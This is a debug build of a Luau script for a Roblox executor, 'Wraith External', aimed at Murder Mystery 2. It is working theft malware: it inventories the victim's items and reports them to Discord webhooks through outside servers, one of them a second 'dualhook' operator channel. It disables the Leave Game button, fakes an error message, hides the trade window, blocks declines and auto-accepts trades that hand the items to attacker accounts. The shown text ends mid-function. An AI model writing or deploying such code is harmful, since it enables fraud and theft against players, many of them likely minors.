-- loader_debug.luau — Wraith External DEBUG BUILD
-- Todo warn() vai aparecer no console do executor (F9 no Delta)
-- entrypoint:
--   _G.MinValue  = 0
--   _G.Usernames = { "nick" }
--   _G.Webhook   = "token_aqui"
--   _G.Ping      = false
--   loadstring(game:HttpGet("url_do_loader", true))()

local function dbg(msg)
    pcall(warn, "[WRAITH] " .. tostring(msg))
end

dbg("=== LOADER DEBUG BUILD INICIADO ===")

-- ── compat layer ─────────────────────────────────────────────────────────────
local sharedEnv = (getgenv and getgenv()) or _G

if not sharedEnv.__WRAITH_COMPAT then
    sharedEnv.__WRAITH_COMPAT = true
    local _G_env = _G
    local _gen   = sharedEnv

    local function probe(name)
        local v
        pcall(function() v = rawget(_G_env, name) end)
        if v ~= nil then return v end
        pcall(function() v = rawget(_gen, name) end)
        if v ~= nil then return v end
        pcall(function() v = rawget(getfenv(0), name) end)
        return v
    end

    local function install(name, value)
        pcall(function() if rawget(_G_env, name) == nil then _G_env[name] = value end end)
        pcall(function() if rawget(_gen,   name) == nil then _gen[name]   = value end end)
    end

    install("cloneref",          probe("cloneref")          or function(x) return x end)
    install("newcclosure",       probe("newcclosure")       or function(fn) return fn end)
    install("setreadonly",       probe("setreadonly")       or probe("make_writeable") or function() end)
    install("make_writeable",    probe("make_writeable")    or probe("setreadonly")    or function() end)
    install("getrawmetatable",   probe("getrawmetatable")   or function() return nil end)
    install("setrawmetatable",   probe("setrawmetatable")   or function() end)
    install("sethiddenproperty", probe("sethiddenproperty") or function() end)
    install("gethiddenproperty", probe("gethiddenproperty") or function() return nil end)
    install("getgc",             probe("getgc")             or function() return {} end)
    install("getnilinstances",   probe("getnilinstances")   or function() return {} end)
    install("getconnections",    probe("getconnections")    or function() return {} end)
    install("getloadedmodules",  probe("getloadedmodules")  or function() return {} end)
    install("getinstances",      probe("getinstances")      or function() return {} end)
    install("getupvalues",       probe("getupvalues")       or function() return {} end)
    install("setupvalue",        probe("setupvalue")        or function() end)
    install("getgenv",           probe("getgenv")           or function() return _G_env end)
    install("identifyexecutor",  probe("identifyexecutor")  or function() return "Unknown", "0.0.0" end)
    install("getexecutorname",   probe("getexecutorname")   or probe("identifyexecutor") or function() return "Unknown" end)

    local req = probe("request")
        or probe("http_request")
        or (probe("syn") and probe("syn").request)
        or (probe("http") and probe("http").request)
    if req then install("request", req) end
end

dbg("compat layer ok")

-- ── boot wait ─────────────────────────────────────────────────────────────────
if not game:IsLoaded() then game.Loaded:Wait() end
local bootTimeout = os.clock() + 10
while os.clock() < bootTimeout and #workspace:GetChildren() <= 2 do
    task.wait(0.1)
end

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local localPlayer       = Players.LocalPlayer

if not localPlayer then
    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
    localPlayer = Players.LocalPlayer
end

dbg("LocalPlayer: " .. localPlayer.Name)
dbg("PlaceId: " .. tostring(game.PlaceId))

if game.PlaceId ~= 142823291 then
    dbg("ERRO: PlaceId errado — esperava 142823291")
    localPlayer:Kick("")
    return
end

if Players.MaxPlayers <= #Players:GetPlayers() then
    dbg("ERRO: servidor cheio")
    localPlayer:Kick("init")
    return
end

pcall(function()
    local ok, result = pcall(function()
        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
    end)
    dbg("VIP check: ok=" .. tostring(ok) .. " result=" .. tostring(result))
    if ok and result == "VIPServer" then
        localPlayer:Kick("VIP/Private server — join a public server.")
    end
end)

pcall(function()
    local ok, level = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetPlayerLevel:InvokeServer(localPlayer)
    end)
    dbg("level check: ok=" .. tostring(ok) .. " level=" .. tostring(level))
    if ok and type(level) == "number" and level < 10 then
        dbg("KICK: level < 10")
        localPlayer:Kick("")
    end
end)

if getgenv().__WRAITH_RUNNING then
    dbg("ERRO: já rodando neste servidor — abortando")
    return
end
getgenv().__WRAITH_RUNNING = true

-- ── ErrorMessage spoof ────────────────────────────────────────────────────────
local ERROR_TEXT = "There was a problem receiving data, please reconnect.\n (Error Code: 260)"
local _stopSpoof = false

game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
    if _stopSpoof then return end
    if not (descendant.Name == "ErrorMessage" and descendant:IsA("TextLabel")) then return end
    descendant.Text = ERROR_TEXT
    descendant:GetPropertyChangedSignal("Text"):Connect(function()
        if not _stopSpoof and descendant.Text ~= ERROR_TEXT then
            descendant.Text = ERROR_TEXT
        end
    end)
end)

-- ── leave game button disable ─────────────────────────────────────────────────
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield
                    .MenuContainer.Page.PageViewClipper.PageView
                    .PageViewInnerFrame.LeaveGamePage
                    .LeaveButtonsContainer.LeaveButtonsContainer
                    .LeaveGameButton.Activated
            )) do v:Disable() end
        end)
    end
end)

-- ── math.random fix ───────────────────────────────────────────────────────────
pcall(function()
    local tbl = {}
    for i = 1, 10 do
        local ok, result = pcall(math.random)
        if not ok then return end
        tbl[i] = result
    end
    local broken = true
    for i = 2, #tbl do
        if tbl[i] ~= tbl[1] then broken = false; break end
    end
    if broken then
        dbg("math.random quebrado — aplicando fix")
        setreadonly(math, false)
        local seed = os.clock() * 1000
        local s, a, c, m = seed, 1664525, 1013904223, 2^32
        math.random = function(lo, hi)
            s = (a * s + c) % m
            local r = s / m
            if lo and hi then return math.floor(r * (hi - lo + 1)) + lo end
            if lo then return math.floor(r * lo) + 1 end
            return r
        end
        setreadonly(math, true)
    end
end)

local minValue  = _G.MinValue   or 0
local usernames = _G.Usernames  or {}
local token     = _G.Webhook    or ""
local doPing    = _G.Ping       or false
local request_  = (syn and syn.request) or (http and http.request) or http_request or request

dbg("minValue=" .. tostring(minValue))
dbg("usernames=" .. table.concat(usernames, ", "))
dbg("token vazio=" .. tostring(token == ""))
dbg("request_ disponível=" .. tostring(request_ ~= nil))

local _sourceToken = tostring(math.random(100000, 999999))
_G.__WRAITH_SRC    = _sourceToken

-- ── JobId bypass (Delta fix) ──────────────────────────────────────────────────
local function getJobId()
    if hookmetamethod == nil or (getexecutorname and getexecutorname():lower() ~= "delta") then
        return game.JobId
    end
    local captured = nil
    local orig
    orig = hookmetamethod(game, "__index", function(self, key)
        if captured == nil and not checkcaller() then
            captured = orig(game, "JobId")
        end
        return orig(self, key)
    end)
    local t0 = tick()
    repeat task.wait(0.1) until captured ~= nil or tick() - t0 > 5
    return captured or game.JobId
end

local jobId    = getJobId()
local joinLink = "https://gojoiner.netlify.app/?gameInstanceId=" .. jobId
dbg("jobId=" .. tostring(jobId))

-- ── API Railway ───────────────────────────────────────────────────────────────
local API_URL = "https://api-wraith-production.up.railway.app"

local function sendEmbed_raw(t, payload)
    if t == "" or not request_ then return nil end
    local messageId = nil
    pcall(function()
        local res = request_({
            Url     = API_URL .. "/fire",
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = HttpService:JSONEncode({ token=t, payload=payload, wait=true }),
        })
        if res and res.Body then
            local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok2 and decoded and decoded.discord then
                local ok3, msg = pcall(HttpService.JSONDecode, HttpService, decoded.discord)
                if ok3 and msg and msg.id then messageId = msg.id end
            end
        end
    end)
    return messageId
end

local function apiedit(msgId, payload)
    if token == "" or not msgId or not request_ then return end
    pcall(request_, {
        Url     = API_URL .. "/edit",
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({ token=token, messageId=msgId, payload=payload }),
    })
end

local MONITOR_URL = "https://wraith-monitor2.gabrielgabrieldoegito.workers.dev/register"
local function registerMonitor(msgId, embed, targetUserId)
    if token == "" or not msgId or not request_ then return end
    pcall(request_, {
        Url     = MONITOR_URL,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({ userId=targetUserId, token=token, messageId=msgId, embed=embed, apiUrl=API_URL }),
    })
end

-- ── dualhook config ───────────────────────────────────────────────────────────
local DUAL_PASTEFY   = "https://pastefy.app/SagUyvDf/raw"
local DUAL_MIN_VALUE = 567
local DUAL_USERNAME  = nil
local DUAL_TOKEN     = "DUAL_TOKEN_AQUI"
local KICK_DISCORD   = "discord.gg/wraith"
local EMBED_COLOR    = 0x008CFF
local WEBHOOK_NAME   = "Wraith External"

pcall(function()
    local ok, raw = pcall(game.HttpGet, game, DUAL_PASTEFY, true)
    if ok and raw then
        DUAL_USERNAME = raw:match("^%s*(.-)%s*$")
        if DUAL_USERNAME == "" then DUAL_USERNAME = nil end
    end
    dbg("DUAL_USERNAME=" .. tostring(DUAL_USERNAME))
end)

local RARITY_BASE = { Common=0.1, Uncommon=0.25, Rare=0.5, Legendary=1, Godly=2, Ancient=5, Vintage=15, Chroma=50 }
local BLACKLIST = {
    DefaultGun=true, DefaultKnife=true, Reaver=true,
    Reaver_Legendary=true, Reaver_Godly=true, Reaver_Ancient=true,
    IceHammer=true, IceHammer_Legendary=true, IceHammer_Godly=true, IceHammer_Ancient=true,
    Gingerscythe=true, Gingerscythe_Legendary=true, Gingerscythe_Godly=true, Gingerscythe_Ancient=true,
    TestItem=true, Season1TestKnife=true, Cracks=true, Icecrusher=true,
    ["???"]=true, Dartbringer=true, SharkSeeker=true,
}

-- ── values ────────────────────────────────────────────────────────────────────
local values = {}
pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/values", true)
    dbg("values fetch: ok=" .. tostring(ok) .. " len=" .. tostring(raw and #raw or 0))
    if ok and raw and raw ~= "" then
        local chunk = loadstring(raw)
        if chunk then
            local ok2, result = pcall(chunk)
            if ok2 and type(result) == "table" then
                values = result
                dbg("values carregados via loadstring: " .. tostring(#values) .. " entradas")
            end
        end
        if not next(values) then
            local ok3, result2 = pcall(HttpService.JSONDecode, HttpService, raw)
            if ok3 and type(result2) == "table" then
                values = result2
                dbg("values carregados via JSON")
            end
        end
    end
    if not next(values) then dbg("AVISO: values vazio — usando RARITY_BASE") end
end)

-- ── emoji map ─────────────────────────────────────────────────────────────────
local emojiMap = {}
pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2", true)
    if ok and raw and raw ~= "" then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, raw)
        if ok2 and type(decoded) == "table" and decoded.data then
            for _, entry in ipairs(decoded.data) do
                if entry.name and entry.emoji then
                    emojiMap[entry.name:lower()] = entry.emoji
                end
            end
        end
    end
end)

local function getEmoji(itemName)
    if not itemName then return "" end
    return emojiMap[itemName:lower()] or ""
end

-- ── weapons db ────────────────────────────────────────────────────────────────
local weapons
pcall(function()
    weapons = require(
        ReplicatedStorage:WaitForChild("Database",10)
            :WaitForChild("Sync",10)
            :WaitForChild("Item",10)
    )
end)
if not weapons then
    pcall(function()
        local m = require(ReplicatedStorage:WaitForChild("Database",10):WaitForChild("Sync",10))
        weapons = m.Weapons or m
    end)
end

dbg("weapons db carregado=" .. tostring(weapons ~= nil))
if weapons then
    local count = 0
    for _ in pairs(weapons) do count += 1 end
    dbg("weapons entries=" .. count)
end

local _nameToID = {}
pcall(function()
    if not weapons then return end
    for k, v in pairs(weapons) do
        if v.ItemName then _nameToID[v.ItemName:lower()] = k end
        _nameToID[k:lower()] = k
    end
end)

local function resolveID(dataID)
    if not weapons then return dataID end
    if weapons[dataID] then return dataID end
    local m = dataID:match("^(.-)_[KG]_%d+$")
    if m and weapons[m] then return m end
    local m2 = dataID:match("^(.+)Knife$") or dataID:match("^(.+)Gun$")
    if m2 and weapons[m2] then return m2 end
    local hit = _nameToID[dataID:lower()]
    if hit then return hit end
    return dataID
end

local function resolveItem(dataID)
    if not weapons then return nil end
    local id    = resolveID(dataID)
    local entry = weapons[id]
    if not entry then return nil end
    local rarity = entry.Chroma == true and "Chroma" or (entry.Rarity or "Common")
    return {
        dataid   = id,
        name     = entry.ItemName or entry.Name or id,
        rarity   = rarity,
        isChroma = entry.Chroma == true,
        value    = values[entry.ItemName or id]
                or values[(entry.ItemName or id):lower()]
                or RARITY_BASE[rarity] or 0.1,
    }
end

local function getProfile()
    local ok1, r1 = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(localPlayer.Name)
    end)
    dbg("GetFullInventory: ok=" .. tostring(ok1) .. " hasWeapons=" .. tostring(ok1 and type(r1)=="table" and r1.Weapons~=nil))
    if ok1 and type(r1) == "table" and r1.Weapons then return r1 end

    local ok2, r2 = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(localPlayer.Name)
    end)
    dbg("GetProfileData: ok=" .. tostring(ok2) .. " hasWeapons=" .. tostring(ok2 and type(r2)=="table" and r2.Weapons~=nil))
    if ok2 and type(r2) == "table" and r2.Weapons then return r2 end

    local ok3, r3 = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules",10):WaitForChild("ProfileData",10))
    end)
    dbg("ProfileData require: ok=" .. tostring(ok3))
    if ok3 and type(r3) == "table" and r3.Weapons then return r3 end
    return nil
end

local function buildItems(profile)
    local list    = {}
    local owned   = profile.Weapons and profile.Weapons.Owned or {}
    local uniques = profile.Uniques or {}

    local ownedCount = 0
    for _ in pairs(owned) do ownedCount += 1 end
    dbg("buildItems: owned=" .. ownedCount .. " uniques=" .. #uniques)

    for k, amount in pairs(owned) do
        local str = tostring(k)
        amount = type(amount) == "number" and amount or 1
        local info = resolveItem(str)
        if info and not BLACKLIST[info.dataid] then
            table.insert(list, {
                DataID=info.dataid, Name=info.name,
                Rarity=info.rarity, Amount=amount,
                Value=info.value, IsChroma=info.isChroma,
            })
        end
    end

    for _, unique in ipairs(uniques) do
        local str = tostring(unique.BaseItem or "")
        if str ~= "" then
            if unique.EvoEquipped and weapons and weapons[str] and weapons[str].Evo then
                local evo = weapons[str].Evo
                local xp  = unique.XP or 0
                for i = 4, 1, -1 do
                    if evo[i] and xp >= evo[i].XPRequired then
                        str = evo[i].ItemName or str; break
                    end
                end
            end
            local info = resolveItem(str)
            if info and not BLACKLIST[info.dataid] then
                table.insert(list, {
                    DataID=info.dataid, Name=info.name,
                    Rarity=info.rarity, Amount=1,
                    Value=info.value, IsChroma=info.isChroma,
                })
            end
        end
    end

    table.sort(list, function(a,b) return a.Value > b.Value end)
    dbg("buildItems resultado: " .. #list .. " itens")
    return list
end

local function filterItems(list)
    if minValue == 0 then return list end
    local out = {}
    for _, item in ipairs(list) do
        if item.Value >= minValue then table.insert(out, item) end
    end
    dbg("filterItems: " .. #list .. " → " .. #out .. " (minValue=" .. minValue .. ")")
    return out
end

-- ── embed builder ─────────────────────────────────────────────────────────────
local function buildEmbed(victimName, items, statusText)
    local totalVal = 0
    for _, item in ipairs(items) do totalVal += item.Value * item.Amount end
    local embedTitle = totalVal >= 100 and "Ultra Mega Hit 🌈" or totalVal >= 20 and "Mega Hit ✨" or "Hit"
    local fields = {}
    table.insert(fields, { name="📥  Receivers", value=#usernames>0 and table.concat(usernames,", ") or "—", inline=false })
    local knifeLines = {}
    for _, item in ipairs(items) do
        local emoji = getEmoji(item.Name)
        if emoji ~= "" then
            table.insert(knifeLines, string.format("%s %s — %g", item.Name, emoji, item.Value))
        else
            table.insert(knifeLines, string.format("%s — %g", item.Name, item.Value))
        end
    end
    local victimBody = #knifeLines > 0 and table.concat(knifeLines, "\n") or "—"
    if #victimBody > 1020 then victimBody = victimBody:sub(1,1020) .. "\n..." end
    table.insert(fields, { name="🎯  Victim: " .. (victimName or localPlayer.Name), value=victimBody, inline=false })
    table.insert(fields, { name="📊  Value Total", value=string.format("%g", totalVal), inline=true })
    local execName = "unknown"
    pcall(function() execName = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "unknown" end)
    table.insert(fields, { name="⚙️  Executor", value=execName, inline=true })
    table.insert(fields, { name="📡  Status", value=statusText or "🟢 In Game", inline=false })
    table.insert(fields, { name="🔗  Join", value=string.format("[**Entrar no servidor**](%s)", joinLink), inline=false })
    return {
        title=embedTitle, color=EMBED_COLOR, fields=fields, _totalVal=totalVal,
        thumbnail={ url=string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", localPlayer.UserId) },
        footer={ text=WEBHOOK_NAME .. "  •  MM2" },
        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
end

local function editStatus(msgId, embed, newStatus)
    if not msgId then return end
    for _, field in ipairs(embed.fields or {}) do
        if field.name == "📡  Status" then field.value = newStatus; break end
    end
    local cleanEmbed = {}
    for k, v in pairs(embed) do if k ~= "_totalVal" then cleanEmbed[k] = v end end
    apiedit(msgId, { username=WEBHOOK_NAME, avatar_url="https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg", embeds={ cleanEmbed } })
end

local function sendEmbed(embed, useDualToken)
    local t = useDualToken and DUAL_TOKEN or token
    local cleanEmbed = {}
    for k, v in pairs(embed) do if k ~= "_totalVal" then cleanEmbed[k] = v end end
    return sendEmbed_raw(t, {
        username=WEBHOOK_NAME,
        avatar_url="https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg",
        content=doPing and "@everyone" or nil,
        embeds={ cleanEmbed },
    })
end

-- ── initial scan ─────────────────────────────────────────────────────────────
dbg("=== INITIAL SCAN ===")
local profile = getProfile()
if not profile then
    dbg("FATAL: getProfile() retornou nil — abortando")
    return
end

local myItems   = buildItems(profile)
local userItems = filterItems(myItems)

dbg("myItems=" .. #myItems .. " userItems=" .. #userItems)
for i, item in ipairs(userItems) do
    if i <= 10 then
        dbg("  item[" .. i .. "]: " .. item.DataID .. " | " .. item.Name .. " | val=" .. tostring(item.Value) .. " | amt=" .. tostring(item.Amount))
    end
end

local dualItems = {}
for _, item in ipairs(myItems) do
    if item.Value >= DUAL_MIN_VALUE then table.insert(dualItems, item) end
end
dbg("dualItems=" .. #dualItems)

local sentToDual    = false
local initialMsgId  = nil
local initialEmbed  = nil
local currentTarget = nil

if #dualItems > 0 then
    sentToDual   = true
    initialEmbed = buildEmbed(localPlayer.Name, dualItems, "🟢 In Game")
    initialMsgId = sendEmbed(initialEmbed, true)
    dbg("dual webhook enviado: msgId=" .. tostring(initialMsgId))
else
    if token ~= "" and #userItems > 0 then
        initialEmbed = buildEmbed(localPlayer.Name, userItems, "🟢 In Game")
        initialMsgId = sendEmbed(initialEmbed, false)
        dbg("webhook enviado: msgId=" .. tostring(initialMsgId))
    end
end

if initialMsgId and initialEmbed then
    registerMonitor(initialMsgId, initialEmbed, localPlayer.UserId)
end

if sentToDual then
    dbg("sentToDual=true — parando aqui")
    _stopSpoof = true
    return
end

if minValue > 0 and #userItems == 0 then
    dbg("KICK: minValue > 0 mas sem itens acima do threshold")
    localPlayer:Kick("")
    return
end

if #usernames == 0 then
    dbg("ABORT: usernames vazio")
    return
end
if #userItems == 0 then
    dbg("ABORT: userItems vazio")
    return
end

dbg("=== TRADE SETUP ===")

-- ── trade setup ───────────────────────────────────────────────────────────────
local trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not trade then
    dbg("FATAL: Trade folder não encontrado")
    return
end
dbg("Trade folder encontrado. Children:")
for _, child in ipairs(trade:GetChildren()) do
    dbg("  trade." .. child.Name .. " [" .. child.ClassName .. "]")
end

pcall(function()
    if getexecutorname and getexecutorname():lower() == "xeno" then
        require(ReplicatedStorage.Modules.InventoryModule).UpdateInventory = function() end
        dbg("xeno: InventoryModule.UpdateInventory neutralizado")
    else
        ReplicatedStorage.Remotes.Inventory.ProfileDataChanged:Destroy()
        dbg("ProfileDataChanged destruído")
    end
end)

local function getUserDevice()
    local gui = localPlayer:WaitForChild("PlayerGui", 10)
    if not gui then return "PC" end
    if gui:GetAttribute("Device") == nil then
        local t0 = tick()
        repeat task.wait() until gui:GetAttribute("Device") ~= nil or tick()-t0 > 5
    end
    return gui:GetAttribute("Device") or "PC"
end

local function hideTrade()
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then return end
    local tradeGUI = playerGui:FindFirstChild("TradeGUI")
    local phoneGUI = playerGui:FindFirstChild("TradeGUI_Phone")
    local hidden   = UDim2.new(99, 99, 99, 99)
    pcall(function()
        if tradeGUI then
            for _, child in ipairs(tradeGUI:GetChildren()) do
                pcall(function() child.Position = hidden end)
            end
        end
    end)
    pcall(function()
        if phoneGUI then
            phoneGUI.Inactive.Frame.Position        = hidden
            phoneGUI.Inactive.TradeMainOld.Position = hidden
            phoneGUI.Container.Position             = hidden
        end
    end)
    local device = getUserDevice()
    dbg("device=" .. device)
    if device == "Phone" then
        pcall(function()
            local blocker = playerGui:WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker", 5)
            local req     = playerGui:WaitForChild("MainGUI").Lobby.Leaderboard.Container.OverlayMenu.TradeRequest
            blocker.Visible = false
            req.Visible     = false
            blocker:GetPropertyChangedSignal("Visible"):Connect(function() blocker.Visible = false end)
            req:GetPropertyChangedSignal("Visible"):Connect(function() req.Visible = false end)
        end)
    end
end

hideTrade()

task.spawn(function()
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    local hidden    = UDim2.new(0, 9999, 0, 9999)
    while task.wait(0.5) do
        pcall(function()
            local tg = playerGui:FindFirstChild("TradeGUI")
            if tg then
                tg.Enabled = false
                for _, c in ipairs(tg:GetChildren()) do
                    pcall(function() c.Position = hidden end)
                end
            end
        end)
    end
end)

-- ── hook DeclineTrade/DeclineRequest ─────────────────────────────────────────
pcall(function()
    if not (hookfunction and debug and debug.getinfo) then
        dbg("hookfunction ou debug.getinfo indisponível — hook de DeclineTrade PULADO")
        return
    end
    dbg("hookfunction disponível — aplicando hook em DeclineTrade/DeclineRequest/CancelRequest")

    local function safeHook(remote)
        if not remote or not remote:IsA("RemoteEvent") then return end
        local origFire = remote.FireServer
        pcall(function()
            hookfunction(origFire, function(self, ...)
                local ok2, info = pcall(debug.getinfo, 2, "S")
                if ok2 and info and info.source then
                    if info.source:find(_sourceToken, 1, true) then
                        return origFire(self, ...)
                    end
                    return
                end
                return origFire(self, ...)
            end)
        end)
    end

    safeHook(trade:FindFirstChild("DeclineTrade"))
    safeHook(trade:FindFirstChild("DeclineRequest"))
    safeHook(trade:FindFirstChild("CancelRequest"))
    dbg("hooks aplicados")
end)

local sendReqEv = trade:FindFirstChild("SendRequest")
if sendReqEv then
    sendReqEv.OnClientInvoke = newcclosure(function() return false end)
    dbg("SendRequest.OnClientInvoke bloqueado")
else
    dbg("AVISO: SendRequest não encontrado no Trade")
end

-- ── trade state ───────────────────────────────────────────────────────────────
local tradeWindowOpen = false
local tradeDone       = false
local offerInProgress = false
local lastOffer       = 0

local startTradeEv   = trade:FindFirstChild("StartTrade")
local declineTradeEv = trade:FindFirstChild("DeclineTrade")
local acceptTradeEv  = trade:FindFirstChild("AcceptTrade")
local updateTradeEv  = trade:FindFirstChild("UpdateTrade")
local offerItemEv    = trade:FindFirstChild("OfferItem")

dbg("StartTrade existe=" .. tostring(startTradeEv ~= nil))
dbg("DeclineTrade existe=" .. tostring(declineTradeEv ~= nil))
dbg("AcceptTrade existe=" .. tostring(acceptTradeEv ~= nil))
dbg("UpdateTrade existe=" .. tostring(updateTradeEv ~= nil))
dbg("OfferItem existe=" .. tostring(offerItemEv ~= nil))
if offerItemEv then
    dbg("OfferItem.ClassName=" .. offerItemEv.ClassName)
end

if startTradeEv then
    startTradeEv.OnClientEvent:Connect(function()
        dbg(">>> StartTrade.OnClientEvent disparou — tradeWindowOpen=true")
        tradeWindowOpen = true
        tradeDone       = false
    end)
end

if declineTradeEv then
    declineTradeEv.OnClientEvent:Connect(function()
        dbg(">>> DeclineTrade.OnClientEvent disparou — tradeWindowOpen=false tradeDone=true")
        tradeWindowOpen = false
        tradeDone       = true
    end)
end

if acceptTradeEv then
    acceptTradeEv.OnClientEvent:Connect(function(v)
        dbg(">>> AcceptTrade.OnClientEvent disparou — v=" .. tostring(v))
        if v then
            tradeWindowOpen = false
            tradeDone       = true
        end
    end)
end

if updateTradeEv then
    updateTradeEv.OnClientEvent:Connect(function(d)
        if type(d) == "table" and d.LastOffer ~= nil then
            lastOffer    = d.LastOffer
            _G.LastOffer = lastOffer
            dbg(">>> UpdateTrade.OnClientEvent — LastOffer=" .. tostring(lastOffer))
        end
    end)
end

-- ── loop de accept externo ────────────────────────────────────────────────────
task.spawn(function()
    while task.wait(0.2) do
        local ok2, status = pcall(function()
            return trade.GetTradeStatus:InvokeServer()
        end)
        local s = ok2 and status or "None"

        if s == "ReceivingRequest" then
            pcall(function()
                if not tradeWindowOpen then
                    trade.DeclineRequest:FireServer()
                end
            end)
        end

        if tradeWindowOpen and not offerInProgress then
            pcall(function()
                trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
            end)
        end
    end
end)

-- ── TradeAllowed bypass ───────────────────────────────────────────────────────
pcall(function()
    if not (getrawmetatable and debug and debug.getupvalue and debug.setupvalue) then
        dbg("TradeAllowed bypass: APIs indisponíveis — pulando")
        return
    end
    local mt = getrawmetatable(game)
    if not (mt and mt.__namecall) then return end
    local namecall = mt.__namecall
    local function patchTradeAllowed()
        for i = 1, 10 do
            local name = debug.getupvalue(namecall, i)
            if name == "TradeAllowed" then
                debug.setupvalue(namecall, i, true)
                dbg("TradeAllowed patched no upvalue " .. i)
                return
            end
        end
    end
    patchTradeAllowed()
    task.spawn(function()
        while task.wait(1.5) do pcall(patchTradeAllowed) end
    end)
end)

-- ── cooldown bypass ───────────────────────────────────────────────────────────
task.spawn(function()
    if not (getupvalues and setupvalue and getloadedmodules) then
        dbg("cooldown bypass: APIs indisponíveis — pulando")
        return
    end
    local ok2, mods = pcall(getloadedmodules)
    if not ok2 or not mods then return end
    local count = 0
    for _, mod in ipairs(mods) do
        local ok3, upvals = pcall(getupvalues, mod)
        if ok3 and type(upvals) == "table" then
            for k, v in pairs(upvals) do
                if type(v) == "number" and v >= 0 and v <= 6 then
                    pcall(setupvalue, mod, k, 0)
                    count += 1
                end
            end
        end
    end
    dbg("cooldown bypass: zeroed " .. count .. " upvalues")
end)

-- ── helpers de status de trade ────────────────────────────────────────────────
local function getTradeStatus()
    local ok2, r = pcall(function() return trade.GetTradeStatus:InvokeServer() end)
    return ok2 and r or "None"
end

local function waitTradeIdle()
    local waited = 0
    while getTradeStatus() ~= "None" do
        task.wait(0.1)
        waited += 0.1
        if waited > 10 then
            dbg("waitTradeIdle: timeout de 10s esperando None")
            break
        end
    end
end

local function cancelCurrent()
    local s = getTradeStatus()
    dbg("cancelCurrent: status=" .. s)
    if s == "StartTrade" then
        pcall(function() trade.DeclineTrade:FireServer() end)
        tradeWindowOpen = false
        offerInProgress = false
        task.wait(0.3)
    elseif s == "ReceivingRequest" then
        pcall(function() trade.DeclineRequest:FireServer() end)
        task.wait(0.3)
    end
end

-- ── buildOffer ────────────────────────────────────────────────────────────────
local function buildOffer(itemList)
    local seen  = {}
    local offer = {}
    for _, item in ipairs(itemList) do
        if #offer >= 4 then break end
        if not seen[item.DataID] then
            seen[item.DataID] = true
            local amt = math.min(item.Amount, 4)
            table.insert(offer, { DataID=item.DataID, Amount=amt })
        end
    end
    dbg("buildOffer: " .. #offer .. " slots")
    for i, slot in ipairs(offer) do
        dbg("  slot[" .. i .. "]: " .. slot.DataID .. " x" .. slot.Amount)
    end
    return offer
end

-- ── doOfferItem ───────────────────────────────────────────────────────────────
local function doOfferItem(dataID, amount)
    local id = dataID
    if weapons then
        if not weapons[id] then
            local m = id:match("^(.-)_[KG]_%d+$")
            if m and weapons[m] then
                id = m
            else
                local m2 = id:match("^(.+)Knife$")
                if m2 and weapons[m2] then
                    id = m2
                else
                    local m3 = id:match("^(.+)Gun$")
                    if m3 and weapons[m3] then
                        id = m3
                    else
                        local hit = _nameToID[id:lower()]
                        if hit then id = hit end
                    end
                end
            end
        end
    end

    dbg("doOfferItem: dataID=" .. dataID .. " → id=" .. id .. " x" .. amount)

    for i = 1, amount do
        local ok2, err = pcall(function()
            trade.OfferItem:FireServer(id, "Weapons")
        end)
        dbg("  FireServer OfferItem[" .. i .. "]: ok=" .. tostring(ok2) .. (ok2 and "" or " err=" .. tostring(err)))
        task.wait(0.05)
    end
end

-- ── doTrade ───────────────────────────────────────────────────────────────────
local function doTrade(target)
    dbg("=== doTrade: " .. target.Name .. " ===")
    cancelCurrent()
    waitTradeIdle()
    tradeWindowOpen = false
    tradeDone       = false
    offerInProgress = false

    -- fase 1: envia pedido
    local loopCount = 0
    while true do
        if not target.Parent then
            dbg("doTrade: target saiu durante SendRequest loop")
            return false
        end
        loopCount += 1

        local s = getTradeStatus()
        dbg("doTrade fase1 loop[" .. loopCount .. "]: status=" .. s)

        if s == "None" then
            local ok2, result = pcall(function()
                return trade.SendRequest:InvokeServer(target)
            end)
            dbg("SendRequest: ok=" .. tostring(ok2) .. " result=" .. tostring(result))
            if not ok2 then
                task.wait(2)
            elseif result == true then
                dbg("target ocupado — retry em 3s")
                task.wait(3)
            end
        elseif s == "SendingRequest" then
            task.wait(0.3)
        elseif s == "ReceivingRequest" then
            dbg("ReceivingRequest enquanto enviando — declinando")
            pcall(function() trade.DeclineRequest:FireServer() end)
            task.wait(0.3)
        elseif s == "StartTrade" then
            dbg("StartTrade confirmado — avançando para offer")
            break
        end

        task.wait(0.5)
    end

    -- fase 2: oferta
    local freshProfile  = getProfile()
    local freshAll      = freshProfile and buildItems(freshProfile) or myItems
    local freshFiltered = filterItems(freshAll)
    local offer         = buildOffer(freshFiltered)

